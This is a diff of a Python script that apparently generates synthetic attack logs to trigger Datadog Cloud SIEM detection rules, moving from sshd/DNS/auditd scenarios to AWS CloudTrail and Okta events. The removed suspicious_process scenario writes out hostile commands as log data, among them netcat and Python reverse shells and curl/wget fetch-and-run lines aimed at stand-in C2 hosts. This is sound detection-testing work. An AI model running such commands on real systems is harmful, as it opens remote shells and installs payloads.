@@ -2,64 +2,65 @@
 """
 Cloud SIEM Event Generator
 
-Produces log lines that match Datadog Cloud SIEM out-of-the-box detection rules.
-Each scenario writes to a separate log file so the Datadog Agent can tag them
-with the correct source (sshd, auth, dns, sudo, auditd, firewall).
+Produces synthetic log events in the native format of real integrations
+(AWS CloudTrail, Okta) so that Datadog's built-in log pipelines parse them
+and OOTB Cloud SIEM detection rules generate Security Signals automatically.
+
+Each integration writes to its own log file.  The Datadog Agent collects
+them with the correct `source` tag, which activates the matching pipeline.
+
+Targeted OOTB rules (10 total):
+  CloudTrail (6):
+    - AWS CloudTrail configuration modified              (StopLogging)
+    - AWS GuardDuty detector deleted                     (DeleteDetector)
+    - AWS IAM AdministratorAccess policy applied to user (AttachUserPolicy)
+    - AWS EBS Snapshot Made Public                       (ModifySnapshotAttribute)
+    - AWS KMS key deleted or scheduled for deletion      (ScheduleKeyDeletion)
+    - AWS CloudWatch log group deleted                   (DeleteLogGroup)
+  Okta (4):
+    - Okta API Token Created or Enabled                  (system.api_token.create)
+    - Okta administrator role assigned to user           (user.account.privilege.grant)
+    - Okta MFA reset for user                            (user.mfa.factor.reset_all)
+    - Okta policy rule deleted                           (policy.rule.delete)
 
 Usage:
     python event-generator.py                          # Run all scenarios once
-    python event-generator.py --loop --interval 30     # Run continuously
-    python event-generator.py --scenario brute_force   # Run one scenario
-    python event-generator.py --output-dir /tmp/siem-test    # Custom output dir
+    python event-generator.py --loop --interval 300    # Run continuously
+    python event-generator.py --scenario cloudtrail    # CloudTrail only
+    python event-generator.py --scenario okta          # Okta only
+    python event-generator.py --output-dir /tmp/siem-test
 """
 
 import argparse
 import json
 import os
 import random
+import string
 import sys
 import time
 from datetime import datetime, timezone
 
-ATTACKER_IPS = [
-    "198.51.100.42",
-    "203.0.113.99",
-    "192.0.2.200",
-    "45.33.32.156",
-]
-
-INTERNAL_IPS = [
-    "10.0.1.50",
-    "10.0.2.100",
-    "172.16.0.15",
-]
-
-USERNAMES = ["admin", "root", "testuser", "bits", "deploy", "service-account"]
-
-GEO_LOCATIONS = [
-    {"city": "New York", "country": "US", "lat": 40.7128, "lon": -74.0060},
-    {"city": "Moscow", "country": "RU", "lat": 55.7558, "lon": 37.6173},
-    {"city": "Beijing", "country": "CN", "lat": 39.9042, "lon": 116.4074},
-    {"city": "Lagos", "country": "NG", "lat": 6.5244, "lon": 3.3792},
-    {"city": "San Francisco", "country": "US", "lat": 37.7749, "lon": -122.4194},
-]
-
-C2_DOMAINS = [
-    "evil-c2-server.xyz",
-    "malware-update.top",
-    "data-exfil-node.cc",
-    "botnet-controller.tk",
-]
-
 DEFAULT_OUTPUT_DIR = "/var/log/sandbox"
 
+ATTACKER_IPS = ["198.51.100.42", "203.0.113.99", "45.33.32.156"]
+AWS_REGIONS = ["us-east-1", "us-west-2", "eu-west-1"]
 
-def ts():
+
+def _ts():
     return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
 
 
-def emit(log_entry, filepath):
-    line = json.dumps(log_entry)
+def _aws_ts():
+    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
+
+
+def _rand_id(prefix="", length=12):
+    chars = string.ascii_lowercase + string.digits
+    return prefix + "".join(random.choices(chars, k=length))
+
+
+def _emit(entry, filepath):
+    line = json.dumps(entry, separators=(",", ":"))
     if filepath:
         os.makedirs(os.path.dirname(filepath), exist_ok=True)
         with open(filepath, "a") as f:
@@ -68,212 +69,274 @@ def emit(log_entry, filepath):
         print(line, flush=True)
 
 
-def log_path(output_dir, filename):
+def _log_path(output_dir, filename):
     if output_dir:
         return os.path.join(output_dir, filename)
     return None
 
 
-def brute_force(output_dir=None):
-    """SSH brute force: 15 failures then 1 success from the same IP."""
-    print("[SIEM] Generating: Brute force SSH login attempts", file=sys.stderr)
+# ---------------------------------------------------------------------------
+# CloudTrail event builder
+# ---------------------------------------------------------------------------
+
+def _cloudtrail_base(event_name, event_source, request_params=None,
+                     response_elements=None, error_code=None):
     ip = random.choice(ATTACKER_IPS)
-    fp = log_path(output_dir, "sshd.log")
-    for _ in range(15):
-        user = random.choice(USERNAMES)
-        emit({
-            "timestamp": ts(),
-            "status": "warning",
-            "host": "sandbox-host",
-            "service": "sshd",
-            "message": f"Failed password for {user} from {ip} port {random.randint(40000, 65000)} ssh2",
-            "evt": {
-                "name": "authentication",
-                "category": "authentication",
-                "outcome": "failure",
-            },
-            "network": {"client": {"ip": ip}},
-            "usr": {"id": user},
-        }, fp)
-        time.sleep(0.2)
-    emit({
-        "timestamp": ts(),
-        "status": "critical",
-        "host": "sandbox-host",
-        "service": "sshd",
-        "message": f"Accepted password for root from {ip} port 54321 ssh2",
-        "evt": {
-            "name": "authentication",
-            "category": "authentication",
-            "outcome": "success",
+    region = random.choice(AWS_REGIONS)
+    account = "123456789012"
+    user = "suspicious-user"
+    event = {
+        "eventVersion": "1.08",
+        "userIdentity": {
+            "type": "IAMUser",
+            "principalId": "AIDAEXAMPLE123456",
+            "arn": f"arn:aws:iam::{account}:user/{user}",
+            "accountId": account,
+            "userName": user,
+            "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
         },
-        "network": {"client": {"ip": ip}},
-        "usr": {"id": "root"},
-    }, fp)
+        "eventTime": _aws_ts(),
+        "eventSource": event_source,
+        "eventName": event_name,
+        "awsRegion": region,
+        "sourceIPAddress": ip,
+        "userAgent": "aws-cli/2.15.0 Python/3.11.6 Linux/5.15.0",
+        "requestParameters": request_params or {},
+        "responseElements": response_elements,
+        "requestID": _rand_id(length=36),
+        "eventID": _rand_id(length=36),
+        "readOnly": False,
+        "eventType": "AwsApiCall",
+        "managementEvent": True,
+        "recipientAccountId": account,
+    }
+    if error_code:
+        event["errorCode"] = error_code
+    return event
 
 
-def impossible_travel(output_dir=None):
-    """Auth from NYC then Moscow within seconds for the same user."""
-    print("[SIEM] Generating: Impossible travel", file=sys.stderr)
-    user = "admin"
-    loc1 = GEO_LOCATIONS[0]  # New York
-    loc2 = GEO_LOCATIONS[1]  # Moscow
-    fp = log_path(output_dir, "auth.log")
+def cloudtrail_scenarios(output_dir=None):
+    """Generate 6 CloudTrail events that each trigger a different OOTB rule."""
+    print("[SIEM] Generating: CloudTrail events (6 OOTB rules)", file=sys.stderr)
+    fp = _log_path(output_dir, "cloudtrail.log")
 
-    emit({
-        "timestamp": ts(),
-        "status": "info",
-        "host": "sandbox-host",
-        "service": "webapp",
-        "message": f"User {user} logged in from {loc1['city']}, {loc1['country']}",
-        "evt": {
-            "name": "authentication",
-            "category": "authentication",
-            "outcome": "success",
+    # 1. StopLogging  ->  "AWS CloudTrail configuration modified"
+    _emit(_cloudtrail_base(
+        event_name="StopLogging",
+        event_source="cloudtrail.amazonaws.com",
+        request_params={"name": "management-trail"},
+    ), fp)
+    time.sleep(0.3)
+
+    # 2. DeleteDetector  ->  "AWS GuardDuty detector deleted"
+    _emit(_cloudtrail_base(
+        event_name="DeleteDetector",
+        event_source="guardduty.amazonaws.com",
+        request_params={"detectorId": _rand_id(length=32)},
+    ), fp)
+    time.sleep(0.3)
+
+    # 3. AttachUserPolicy + AdministratorAccess  ->  "AWS IAM AdministratorAccess policy applied to user"
+    _emit(_cloudtrail_base(
+        event_name="AttachUserPolicy",
+        event_source="iam.amazonaws.com",
+        request_params={
+            "userName": "backdoor-user",
+            "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
         },
-        "network": {
-            "client": {
-                "ip": ATTACKER_IPS[0],
-                "geoip": {
-                    "city_name": loc1["city"],
-                    "country_iso_code": loc1["country"],
-                    "location": {"lat": loc1["lat"], "lon": loc1["lon"]},
-                },
+    ), fp)
+    time.sleep(0.3)
+
+    # 4. ModifySnapshotAttribute public  ->  "AWS EBS Snapshot Made Public"
+    _emit(_cloudtrail_base(
+        event_name="ModifySnapshotAttribute",
+        event_source="ec2.amazonaws.com",
+        request_params={
+            "snapshotId": "snap-0123456789abcdef0",
+            "createVolumePermission": {
+                "add": {"items": [{"group": "all"}]},
+            },
+            "attributeType": "CREATE_VOLUME_PERMISSION",
+        },
+    ), fp)
+    time.sleep(0.3)
+
+    # 5. ScheduleKeyDeletion  ->  "AWS KMS key deleted or scheduled for deletion"
+    _emit(_cloudtrail_base(
+        event_name="ScheduleKeyDeletion",
+        event_source="kms.amazonaws.com",
+        request_params={
+            "keyId": _rand_id(prefix="mrk-", length=32),
+            "pendingWindowInDays": 7,
+        },
+    ), fp)
+    time.sleep(0.3)
+
+    # 6. DeleteLogGroup  ->  "AWS CloudWatch log group deleted"
+    _emit(_cloudtrail_base(
+        event_name="DeleteLogGroup",
+        event_source="logs.amazonaws.com",
+        request_params={"logGroupName": "/aws/lambda/production-api"},
+    ), fp)
+
+    print("[SIEM]   Wrote 6 CloudTrail events to cloudtrail.log", file=sys.stderr)
+
+
+# ---------------------------------------------------------------------------
+# Okta event builder
+# ---------------------------------------------------------------------------
+
+def _okta_base(event_type, outcome="SUCCESS", targets=None,
+               debug_data=None, display_message=""):
+    ip = random.choice(ATTACKER_IPS)
+    event = {
+        "uuid": _rand_id(length=20),
+        "published": _ts(),
+        "eventType": event_type,
+        "version": "0",
+        "severity": "WARN" if outcome == "FAILURE" else "INFO",
+        "legacyEventType": event_type.replace(".", "_"),
+        "displayMessage": {"value": display_message, "args": None},
+        "actor": {
+            "id": "00u" + _rand_id(length=17),
+            "type": "User",
+            "alternateId": "attacker@sandbox-corp.com",
+            "displayName": "Attacker User",
+            "detailEntry": None,
+        },
+        "client": {
+            "userAgent": {
+                "rawUserAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+                "os": "Mac OS X",
+                "browser": "CHROME",
+            },
+            "zone": "null",
+            "device": "Computer",
+            "id": None,
+            "ipAddress": ip,
+            "geographicalContext": {
+                "city": "San Francisco",
+                "state": "California",
+                "country": "United States",
+                "postalCode": "94107",
+                "geolocation": {"lat": 37.7749, "lon": -122.4194},
             },
         },
-        "usr": {"id": user},
-    }, fp)
-
-    time.sleep(2)
-
-    emit({
-        "timestamp": ts(),
-        "status": "info",
-        "host": "sandbox-host",
-        "service": "webapp",
-        "message": f"User {user} logged in from {loc2['city']}, {loc2['country']}",
-        "evt": {
-            "name": "authentication",
-            "category": "authentication",
-            "outcome": "success",
+        "outcome": {"result": outcome, "reason": None},
+        "target": targets or [],
+        "transaction": {"type": "WEB", "id": _rand_id(length=16)},
+        "debugContext": {"debugData": debug_data or {}},
+        "authenticationContext": {
+            "authenticationStep": 0,
+            "externalSessionId": _rand_id(length=20),
         },
-        "network": {
-            "client": {
-                "ip": ATTACKER_IPS[1],
-                "geoip": {
-                    "city_name": loc2["city"],
-                    "country_iso_code": loc2["country"],
-                    "location": {"lat": loc2["lat"], "lon": loc2["lon"]},
-                },
-            },
+        "securityContext": {
+            "asNumber": 0, "asOrg": "", "isp": "", "domain": "", "isProxy": False,
         },
-        "usr": {"id": user},
-    }, fp)
+        "request": {
+            "ipChain": [{"ip": ip, "version": "V4", "source": None}],
+        },
+    }
+    return event
 
 
-def suspicious_dns(output_dir=None):
-    """DNS queries to known C2/malware domains."""
-    print("[SIEM] Generating: Suspicious DNS queries", file=sys.stderr)
-    fp = log_path(output_dir, "dns.log")
-    for domain in C2_DOMAINS:
-        emit({
-            "timestamp": ts(),
-            "status": "warning",
-            "host": "sandbox-host",
-            "service": "dns",
-            "message": f"DNS query for {domain} from {random.choice(INTERNAL_IPS)}",
-            "dns": {"question": {"name": domain, "type": "A"}},
-            "network": {"client": {"ip": random.choice(INTERNAL_IPS)}},
-        }, fp)
-        time.sleep(0.5)
+def okta_scenarios(output_dir=None):
+    """Generate 4 Okta events that each trigger a different OOTB rule."""
+    print("[SIEM] Generating: Okta events (4 OOTB rules)", file=sys.stderr)
+    fp = _log_path(output_dir, "okta.log")
 
+    # 1. system.api_token.create  ->  "Okta API Token Created or Enabled"
+    _emit(_okta_base(
+        event_type="system.api_token.create",
+        outcome="SUCCESS",
+        targets=[{
+            "id": "00t" + _rand_id(length=17),
+            "type": "Token",
+            "alternateId": "unknown",
+            "displayName": "Sandbox Exfil Token",
+            "detailEntry": None,
+        }],
+        display_message="Create API token",
+        debug_data={"requestUri": "/api/v1/tokens"},
+    ), fp)
+    time.sleep(0.3)
 
-def privilege_escalation(output_dir=None):
-    """sudo failures from unprivileged users."""
-    print("[SIEM] Generating: Privilege escalation attempts", file=sys.stderr)
-    fp = log_path(output_dir, "sudo.log")
-    for _ in range(5):
-        user = random.choice(["testuser", "www-data", "nobody"])
-        emit({
-            "timestamp": ts(),
-            "status": "warning",
-            "host": "sandbox-host",
-            "service": "sudo",
-            "message": f"{user} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
-            "evt": {
-                "name": "privilege_escalation",
-                "category": "authentication",
-                "outcome": "failure",
+    # 2. user.account.privilege.grant  ->  "Okta administrator role assigned to user"
+    _emit(_okta_base(
+        event_type="user.account.privilege.grant",
+        outcome="SUCCESS",
+        targets=[
+            {
+                "id": "00u" + _rand_id(length=17),
+                "type": "User",
+                "alternateId": "backdoor@sandbox-corp.com",
+                "displayName": "Backdoor User",
+                "detailEntry": None,
             },
-            "usr": {"id": user},
-        }, fp)
-        time.sleep(0.3)
-
-
-def suspicious_process(output_dir=None):
-    """Unusual process executions: base64 decode, reverse shell, curl piped to sh."""
-    print("[SIEM] Generating: Suspicious process execution", file=sys.stderr)
-    fp = log_path(output_dir, "auditd.log")
-    commands = [
-        ("base64", "base64 -d /tmp/encoded_payload | bash"),
-        ("wget", "wget -q http://evil-c2-server.xyz/shell.sh -O /tmp/shell.sh"),
-        ("nc", "nc -e /bin/bash 198.51.100.42 4444"),
-        ("curl", "curl -s http://malware-update.top/payload | sh"),
-        ("python3", "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"198.51.100.42\",4444))'"),
-    ]
-    for proc_name, cmd in commands:
-        emit({
-            "timestamp": ts(),
-            "status": "critical",
-            "host": "sandbox-host",
-            "service": "auditd",
-            "message": f"Suspicious process execution: {cmd}",
-            "process": {
-                "name": proc_name,
-                "command_line": cmd,
-                "pid": random.randint(1000, 65000),
+            {
+                "id": "00r" + _rand_id(length=17),
+                "type": "ROLE_ASSIGNED",
+                "alternateId": "unknown",
+                "displayName": "Super Administrator",
+                "detailEntry": None,
             },
-            "usr": {"id": "www-data"},
-        }, fp)
-        time.sleep(0.5)
+        ],
+        display_message="Grant user privilege",
+        debug_data={
+            "privilegeGranted": "Super admin",
+            "requestUri": "/api/v1/users/00uXXX/roles",
+        },
+    ), fp)
+    time.sleep(0.3)
+
+    # 3. user.mfa.factor.reset_all  ->  "Okta MFA reset for user"
+    _emit(_okta_base(
+        event_type="user.mfa.factor.reset_all",
+        outcome="SUCCESS",
+        targets=[{
+            "id": "00u" + _rand_id(length=17),
+            "type": "User",
+            "alternateId": "victim@sandbox-corp.com",
+            "displayName": "Victim User",
+            "detailEntry": None,
+        }],
+        display_message="Reset all MFA factors for user",
+        debug_data={"requestUri": "/api/v1/users/00uXXX/lifecycle/reset_factors"},
+    ), fp)
+    time.sleep(0.3)
+
+    # 4. policy.rule.delete  ->  "Okta policy rule deleted"
+    _emit(_okta_base(
+        event_type="policy.rule.delete",
+        outcome="SUCCESS",
+        targets=[{
+            "id": "00p" + _rand_id(length=17),
+            "type": "PolicyRule",
+            "alternateId": "unknown",
+            "displayName": "Require MFA for all users",
+            "detailEntry": None,
+        }],
+        display_message="Delete policy rule",
+        debug_data={"requestUri": "/api/v1/policies/00pXXX/rules/0prXXX"},
+    ), fp)
+
+    print("[SIEM]   Wrote 4 Okta events to okta.log", file=sys.stderr)
 
 
-def data_exfiltration(output_dir=None):
-    """Large outbound data transfers to suspicious IPs."""
-    print("[SIEM] Generating: Data exfiltration patterns", file=sys.stderr)
-    fp = log_path(output_dir, "firewall.log")
-    for _ in range(3):
-        bytes_out = random.randint(50_000_000, 500_000_000)
-        dest_ip = random.choice(ATTACKER_IPS)
-        emit({
-            "timestamp": ts(),
-            "status": "warning",
-            "host": "sandbox-host",
-            "service": "firewall",
-            "message": f"Large outbound transfer to {dest_ip}: {bytes_out // 1_000_000}MB",
-            "network": {
-                "client": {"ip": random.choice(INTERNAL_IPS)},
-                "destination": {"ip": dest_ip, "port": 443},
-                "bytes_written": bytes_out,
-            },
-        }, fp)
-        time.sleep(1)
-
+# ---------------------------------------------------------------------------
+# Scenario registry
+# ---------------------------------------------------------------------------
 
 SCENARIOS = {
-    "brute_force": brute_force,
-    "impossible_travel": impossible_travel,
-    "suspicious_dns": suspicious_dns,
-    "privilege_escalation": privilege_escalation,
-    "suspicious_process": suspicious_process,
-    "data_exfiltration": data_exfiltration,
+    "cloudtrail": cloudtrail_scenarios,
+    "okta": okta_scenarios,
 }
 
 
 def main():
     parser = argparse.ArgumentParser(description="Cloud SIEM Event Generator")
     parser.add_argument("--scenario", choices=list(SCENARIOS.keys()),
-                        help="Run a specific scenario")
+                        help="Run a specific scenario (default: all)")
     parser.add_argument("--output-dir", default=DEFAULT_OUTPUT_DIR,
                         help=f"Directory for log files (default: {DEFAULT_OUTPUT_DIR})")
     parser.add_argument("--stdout", action="store_true",
@@ -294,14 +357,15 @@ def main():
         if args.scenario:
             SCENARIOS[args.scenario](output_dir)
         else:
-            for name, fn in SCENARIOS.items():
+            for fn in SCENARIOS.values():
                 fn(output_dir)
-                time.sleep(2)
+                time.sleep(1)
 
         if not args.loop:
             break
 
-        print(f"[SIEM] Sleeping {args.interval}s before next round...", file=sys.stderr)
+        print(f"[SIEM] Sleeping {args.interval}s before next round...",
+              file=sys.stderr)
         time.sleep(args.interval)
 
 
